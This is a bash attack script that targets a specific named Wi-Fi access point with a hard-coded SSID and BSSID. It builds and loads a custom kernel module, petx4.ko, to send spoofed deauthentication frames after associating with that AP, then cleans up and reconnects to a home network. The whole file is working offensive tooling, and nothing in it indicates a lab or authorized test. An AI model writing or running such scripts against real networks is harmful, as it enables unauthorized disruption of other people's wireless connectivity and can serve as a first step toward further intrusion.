#!/bin/bash
# deauth_pe_attack2.sh - Fixed timing: poll for target connection
#
# Usage: sudo bash /tmp/deauth_pe_attack2.sh

TARGET_SSID="不想上班"
TARGET_BSSID="04:67:61:D6:DC:92"
TARGET_BSSID_LC="04:67:61:d6:dc:92"
HOME_SSID="9899a5b77"

echo "[*] Pre-build petx4..."
cd /tmp
[ -f petx4.ko ] || { as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o; }
echo "    OK"

echo "[*] Setup target AP profile..."
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
nmcli connection add type wifi con-name "$TARGET_SSID" \
    ssid "$TARGET_SSID" \
    wifi-sec.key-mgmt wpa-psk \
    wifi-sec.psk "dummypassword12345678" \
    802-11-wireless.bssid "$TARGET_BSSID" 2>/dev/null
echo "    Profile created"

echo "[*] Disconnect from home..."
nmcli connection down "$HOME_SSID" 2>/dev/null || true
sleep 0.5

echo "[*] Connect to target AP (background)..."
nmcli connection up "$TARGET_SSID" 2>/dev/null &
NMCLI_PID=$!

echo "[*] Polling for target AP connection (max 8s)..."
CONNECTED=0
for i in $(seq 1 80); do
    if dmesg | tail -5 | grep -q "connected to $TARGET_BSSID_LC"; then
        CONNECTED=1
        echo "    Connected! (after ${i}00ms)"
        break
    fi
    sleep 0.1
done

if [ $CONNECTED -eq 0 ]; then
    echo "    FAILED to connect to target. Checking dmesg..."
    dmesg | grep -E "046761|connect|assoc" | tail -5
    echo "[*] Reconnecting home..."
    kill $NMCLI_PID 2>/dev/null
    nmcli connection delete "$TARGET_SSID" 2>/dev/null
    nmcli connection up "$HOME_SSID" 2>/dev/null
    exit 1
fi

echo "[*] Loading petx4 (spoofed deauth)..."
rmmod kfind 2>/dev/null || true
insmod /tmp/petx4.ko 2>&1
echo "    insmod=$?"

sleep 0.5

echo "[*] Results:"
dmesg | grep -E "petx4|Deauth TX" | tail -10

echo "[*] Cleanup..."
kill $NMCLI_PID 2>/dev/null || true
wait $NMCLI_PID 2>/dev/null || true
rmmod kfind 2>/dev/null || true
nmcli connection delete "$TARGET_SSID" 2>/dev/null || true
sleep 1

echo "[*] Reconnect home..."
nmcli connection up "$HOME_SSID" 2>/dev/null || true
sleep 3
nmcli connection show --active | head -5
echo "[*] Done."
